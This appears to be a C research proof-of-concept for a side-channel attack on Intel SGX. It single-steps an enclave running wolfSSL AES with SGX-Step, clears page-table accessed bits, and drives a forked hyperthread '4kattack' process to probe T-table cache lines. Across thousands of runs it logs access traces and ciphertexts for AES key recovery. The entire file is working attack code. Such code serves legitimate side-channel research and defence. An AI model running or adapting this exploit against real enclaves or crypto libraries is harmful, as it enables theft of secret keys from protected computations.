#include "Enclave/encl_u.h"

#include <sgx_urts.h>

#include "libsgxstep/debug.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/apic.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/config.h"
#include "libsgxstep/idt.h"

#include "libcpu.h"

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>

sgx_enclave_id_t eid = 0;

int irq_cnt = 0, do_irq = 1, fault_cnt = 0;
int32_t meas_nb = 0;

unsigned int timer_interval = SGX_STEP_TIMER_INTERVAL;

uint64_t *pte_encl = NULL;
uint64_t *pmd_encl = NULL;

// objdump --section=".rodata" -d -M intel Enclave/encl.so | grep -i -C 10 "<Te>:"
uint32_t offset_ttable = 0x111c0; 
uint32_t length_ttable = 0x1000; 
// Initialized in attacker_config_page_table()
uint32_t offset_ttable2; 
// objdump --section=".text" -d -M intel Enclave/encl.so | grep -i -C 10 "<GetTable_Multi>:" 
// offsets for functions for accessing every cache line of the ttables
uint32_t offset_GetTable_Multi = 0x8cd0;
uint32_t offset_XorTable_Multi = 0x8de0;

uint32_t offset_wc_AesCbcEncrypt = 0xad10;

uint64_t *GetTable_Multi_address = NULL;
uint64_t *XorTable_Multi_address = NULL;
uint64_t *ttable_address = NULL;
uint64_t *ttable_address2 = NULL;

uint64_t *wc_AesCbcEncrypt_address = NULL;

uint64_t *GetTable_Multi_pte = NULL;
uint64_t *XorTable_Multi_pte = NULL;
uint64_t *ttable_pte = NULL;
uint64_t *ttable_pte2 = NULL;

uint64_t *wc_AesCbcEncrypt_pte = NULL;

// Usually this should be 640 (the number of accesses to the T-Table during round key derivation).
// However, there seem to be some unrelated accesses to the pages holding the T-Table and access routines.
// This might change with a different memory layout (e.g. different compiler version)
#define AES_RK_INIT_TTABLE_ACCESSES 660


uint32_t attack_offset = 0;
uint32_t old_attack_offset = 0;

FILE *out_fp;
FILE *cipher_fp;

uint8_t do_measurement = 0;
uint64_t ttable_access_count = 0;
uint64_t ttable_access_count_encryption = 0;

uint32_t attack_offset_in_lut_offset = 0x00;

unsigned int next_active_te = 0;
unsigned int next_active_cache_line = 0;
unsigned int next_active_cache_line_loop_count = 0;

unsigned int zero_step_cnt = 0;

// uint32_t lib4kattack_offset;
uint32_t *shared_mem_pointer = NULL;

// Forward declaration to cleanup in case of zero-stepping
void cleanup(void);

uintptr_t get_new_attack_offset() {
 
  uint32_t new_attack_offset = (((uint64_t) ttable_address) 
      + attack_offset_in_lut_offset
      + next_active_te * 0x400 
      + next_active_cache_line * 0x40) & 0xFFF;
  
  return new_attack_offset;
}

void configure_ht_attacker() {

  attack_offset = get_new_attack_offset();
  
  if (old_attack_offset != attack_offset) {
    shared_mem_pointer[0] = 0;
    shared_mem_pointer[1] = attack_offset;
  }
  return;
}

void update_next_offset_parameters() {

    if (ttable_access_count_encryption < (2560 - 256)) {
        next_active_te = (ttable_access_count_encryption % 256) / 64;
    } else {
        if ((ttable_access_count_encryption % 256) < 64) {
          next_active_te = 2;
        } else if ((ttable_access_count_encryption % 256) < 128) {
          next_active_te = 3;
        } else if ((ttable_access_count_encryption % 256) < 192) {
          next_active_te = 0;
        } else {
          next_active_te = 1;
        }
    }

    next_active_cache_line = 0;
}

void inspect_step() {
  
  if(do_measurement == 1) {
    irq_cnt++;        

    unsigned int accessed_ttable = ACCESSED(*ttable_pte) || ACCESSED(*ttable_pte2);
    unsigned int accessed_wc_AesCbcEncrypt_func = ACCESSED(*wc_AesCbcEncrypt_pte);
    unsigned int accessed_GetTable_Multi_func = ACCESSED(*GetTable_Multi_pte);
    unsigned int accessed_XorTable_Multi_func = ACCESSED(*XorTable_Multi_pte);

    unsigned int valid_access = accessed_ttable && (accessed_GetTable_Multi_func || accessed_XorTable_Multi_func);

    old_attack_offset = attack_offset;

    uint32_t step_time = nemesis_tsc_aex - nemesis_tsc_eresume;

    if (valid_access && irq_cnt > 1) {
      ttable_access_count++;
    }

    // Enter here after first access to t-table
    // For the first relevant t-table access the attacker is preconfigured
    if (valid_access && ttable_access_count > AES_RK_INIT_TTABLE_ACCESSES && irq_cnt > 1) {

        ttable_access_count_encryption++;

        update_next_offset_parameters();
        configure_ht_attacker();
    }
    
    if (irq_cnt > 1) {
      fprintf(out_fp, ",\n");
    }


    fprintf(out_fp, "{\"ic\":%d, \"atto\":\"0x%x\", \"st\":%u, \"attable\":%d, \"agt_m\":%d, \"axt_m\":%d}", 
        irq_cnt, old_attack_offset, step_time, 
        accessed_ttable, 
        accessed_GetTable_Multi_func, accessed_XorTable_Multi_func);

    while(shared_mem_pointer[0] == 0);
  }

}

void prepare_next_step() {
 
  *ttable_pte = MARK_NOT_ACCESSED(*ttable_pte);
  *ttable_pte2 = MARK_NOT_ACCESSED(*ttable_pte2);
  *wc_AesCbcEncrypt_pte = MARK_NOT_ACCESSED(*wc_AesCbcEncrypt_pte);
  *GetTable_Multi_pte = MARK_NOT_ACCESSED(*GetTable_Multi_pte);
  *XorTable_Multi_pte = MARK_NOT_ACCESSED(*XorTable_Multi_pte);
}

void configure_next_apic_interrupt() {
  /*
   * Configure APIC timer interval for next interrupt.
   *
   * On our evaluation platforms, we explicitly clear the enclave's
   * _unprotected_ PMD "accessed" bit below, so as to slightly slow down
   * ERESUME such that the interrupt reliably arrives in the first subsequent
   * enclave instruction.
   *
   */

  if (do_irq) {
    *pmd_encl = MARK_NOT_ACCESSED(*pmd_encl);
    apic_timer_irq(timer_interval);
  }
}

void aep_cb_func(void) {
    
  inspect_step();
  
  prepare_next_step();    
  
  configure_next_apic_interrupt();
}

/* Called upon SIGSEGV caused by untrusted page tables. */
void fault_handler(int signal) {
    info("Caught fault %d! Restoring enclave page permissions..", signal);
    *pte_encl = MARK_NOT_EXECUTE_DISABLE(*pte_encl);
    ASSERT(fault_cnt++ < 10);

    // NOTE: return eventually continues at aep_cb_func and initiates
    // single-stepping mode.
}

void init_enclave(void) {

    int updated = 0;
    sgx_launch_token_t token = { 0 };

    info_event("Creating enclave...");
    SGX_ASSERT(
            sgx_create_enclave("./Enclave/encl.so", /*debug=*/1, &token, &updated, &eid, NULL ));
}

/* Configure and check attacker untrusted runtime environment. */
void attacker_config_runtime(void) {
    ASSERT(!claim_cpu(VICTIM_CPU));
    ASSERT(!prepare_system_for_benchmark(PSTATE_PCT));
    ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);
    print_system_settings();

    if (isatty(fileno(stdout))) {
        info("WARNING: interactive terminal detected; known to cause ");
        info("unstable timer intervals! Use stdout file redirection for ");
        info("precise single-stepping results...");
    }

    register_aep_cb(aep_cb_func);
    register_enclave_info();
    print_enclave_info();
}

/* Provoke page fault on enclave entry to initiate single-stepping mode. */
void attacker_config_page_table(void) {
    
    void *code_adrs;

    sgx_status_t ret = get_wssl_aes_enc_address(eid, &code_adrs);
    SGX_ASSERT(ret);

    info("enclave trigger code address at %p\n", code_adrs);
    ASSERT(pte_encl = remap_page_table_level(code_adrs, PTE));
    fprintf(stdout, "pte_encl addr: %p\n", pte_encl);

    wc_AesCbcEncrypt_address = get_enclave_base() + offset_wc_AesCbcEncrypt;
    GetTable_Multi_address = get_enclave_base() + offset_GetTable_Multi;
    XorTable_Multi_address = get_enclave_base() + offset_XorTable_Multi;
    ttable_address = get_enclave_base() + offset_ttable;
    offset_ttable2 = (offset_ttable + length_ttable) & (~0xFFF);
    ttable_address2 = get_enclave_base() + offset_ttable2;

    ASSERT(wc_AesCbcEncrypt_pte = remap_page_table_level(wc_AesCbcEncrypt_address, PTE));
    ASSERT(GetTable_Multi_pte = remap_page_table_level(GetTable_Multi_address, PTE));
    ASSERT(XorTable_Multi_pte = remap_page_table_level(XorTable_Multi_address, PTE));
    ASSERT(ttable_pte = remap_page_table_level((void* ) ttable_address, PTE));
    ASSERT(ttable_pte2 = remap_page_table_level((void* ) ttable_address2, PTE));

    ASSERT(pmd_encl = remap_page_table_level(get_enclave_base(), PMD));
    fprintf(stdout, "pmd_encl addr: %p\n", pmd_encl);
}

void attacker_interrupt_setup(void) {
    // Using userspace IDT mapping

    idt_t idt = { 0 };

    info_event("Establishing user space APIC/IDT mappings");
    map_idt(&idt);
    // dump_idt(&idt);
    install_kernel_irq_handler(&idt, __ss_irq_handler, IRQ_VECTOR);
    apic_timer_oneshot(IRQ_VECTOR);

    // info_event("Triggering user space software interrupts");
    // asm("int %0\n\t" ::"i"(IRQ_VECTOR):);
    // asm("int %0\n\t" ::"i"(IRQ_VECTOR):);
}

void enable_single_stepping() {

#if SINGLE_STEP_ENABLE
    *pte_encl = MARK_EXECUTE_DISABLE(*pte_encl);
#endif
}

void setup_attacker(void) {

    attacker_config_runtime();
    // attacker_config_page_table();
    attacker_interrupt_setup();
}

void cleanup(void) {
    /* 3. Restore normal execution environment. */
    apic_timer_deadline();
    SGX_ASSERT(sgx_destroy_enclave(eid));
}

void nop() {
}

void set_initial_lut_offset_value() {

    attack_offset_in_lut_offset = 0x140;
}

void call_target() {
    
    fprintf(stdout, "### main.c ### Running wolfssl aes target.\n");
    SGX_ASSERT(wssl_aes_enc(eid));
}


int creating_shared_memory() {

  int shared_mem_fd = shm_open("teejam_comm_memory", O_CREAT | O_RDWR, S_IRUSR | S_IWUSR);
  if (shared_mem_fd == -1) {
    fprintf(stderr, "[main.c] MEMORY_ERROR: Cannot open shared memory.\n");
    return 1;
  }
  
  int res = ftruncate(shared_mem_fd, 8);
  if (res == -1) {
    fprintf(stderr, "[main.c] MEMORY_ERROR: Cannot truncate shared memory.\n");
    return res;
  }

  shared_mem_pointer = mmap(NULL, 8, PROT_READ | PROT_WRITE, MAP_SHARED, shared_mem_fd, 0);
  if (shared_mem_pointer == NULL) {
    fprintf(stderr, "[main.c] MEMORY_ERROR: Cannot mmap shared memory.\n");
    return -1;
  }
}

int main(int argc, char **argv) {

    info("Single stepping timer interval: %u", SGX_STEP_TIMER_INTERVAL);

    char *file_name = "log.out";
    set_initial_lut_offset_value();

    if (argc >= 2) {
        file_name = argv[1];
    }
    if (argc >= 3) {
        char *offset = argv[2];
        attack_offset_in_lut_offset = (uint64_t) strtoul(offset, NULL, 16);
    }

    out_fp = fopen(file_name, "w");
    fprintf(out_fp, "{\"runs\":[\n");

    char cipher_out_name[1024];
    memset(cipher_out_name, '\0', 1024);
    strcat(cipher_out_name, "key_");
    strcat(cipher_out_name, file_name);
    cipher_fp = fopen(cipher_out_name, "w");    

    init_enclave();

    
    fprintf(stdout, "### Setup attacker page table config ###\n");
    attacker_config_page_table();

    fprintf(stdout, "ttabel address: 0x%lx\n", ((uint64_t) ttable_address));
    fprintf(stdout, "lut attack offset (pseudo conflict): 0x%lx\n", attack_offset_in_lut_offset);
    fprintf(stdout, "attack address (pseudo conflict): 0x%lx\n", (((uint64_t) ttable_address) + attack_offset_in_lut_offset));

    attack_offset = (((uint64_t) ttable_address) + attack_offset_in_lut_offset) & 0xFFF;
    
    creating_shared_memory();
    shared_mem_pointer[0] = 1;    
    shared_mem_pointer[1] = attack_offset;

    fprintf(stdout, "Starting 4k attacker process");
    
    signal(SIGALRM, nop);

    fprintf(stdout, "### main.c ### Forking \n");
    int pid = fork();
    if (pid == 0) {
        char target_offset[12];

        sprintf(target_offset, "%x",
                    (uint32_t) attack_offset);

        char *app_name = "ht_attack/4kattack";
        char *params[] = { "ht_attack/4kattack", target_offset, NULL };
        char *env[] = { NULL };
        fprintf(stdout, "### main.c [Child] ### Spawning second exec ###\n");
        execve(app_name, params, env);
    } else {
        pause();

        fprintf(stdout, "### Setup attacker interrupt and runtime ###\n");
        setup_attacker();

        int max_meas = 30000;
        for (int i = 0; i < max_meas; i++) {

            do_irq = 1;
            
            zero_step_cnt = 0;
            irq_cnt = 0;
            ttable_access_count_encryption = 0;
            ttable_access_count = 0;
            do_measurement = 1;
	          
            next_active_te = 0;
            next_active_cache_line = 0;
            next_active_cache_line_loop_count = 0;
            old_attack_offset = attack_offset;
            configure_ht_attacker();
            while(shared_mem_pointer[0] == 0);
 
            enable_single_stepping();
            fprintf(stdout, "Do Measurements %d!\n", i);
            fprintf(out_fp, "{\"run%d\":{\"measurements\":[\n", meas_nb);

            call_target();

            meas_nb += 1;

            fprintf(out_fp, "],\n");
            fprintf(out_fp, "\"analysis_result\": {\n");
            fprintf(out_fp, "\"single_stepping_interrupts\": %d,\n", irq_cnt);
            fprintf(out_fp, "\"ttable_encryption_access_count\": %d\n", ttable_access_count_encryption);
            if (i == (max_meas - 1)) {
                fprintf(out_fp, "}}}");
            } else {
                fprintf(out_fp, "}}},");
            }

            fault_cnt = 0;
	          fprintf(stderr, "Progress: %.4f\r", ((float)(i + 1))/max_meas);
            
            fprintf(cipher_fp, "Run %d\n", i);
            uint8_t cipher[16];
            uint8_t plain[16];
            
            // Plain texts are obtained from debugging purposes only and are of course not required for key reconstruction
            wssl_get_plain(eid, plain);
            wssl_get_cipher(eid, cipher);
            
            fprintf(cipher_fp, "Plain: ");
            for (int a = 0; a < 16; a++) {

              fprintf(cipher_fp, "0x%02x ", plain[a]);
            }

            fprintf(cipher_fp, "\n");

            fprintf(cipher_fp, "Cipher: ");
            for (int a = 0; a < 16; a++) {

              fprintf(cipher_fp, "0x%02x ", cipher[a]);
            }

            fprintf(cipher_fp, "\n\n");

            wssl_update_plain_text(eid);
        }

        fprintf(out_fp, "]\n}");

        kill(pid, SIGINT);
        cleanup();
    }
    fclose(out_fp);
    fclose(cipher_fp);

    return 0;
}
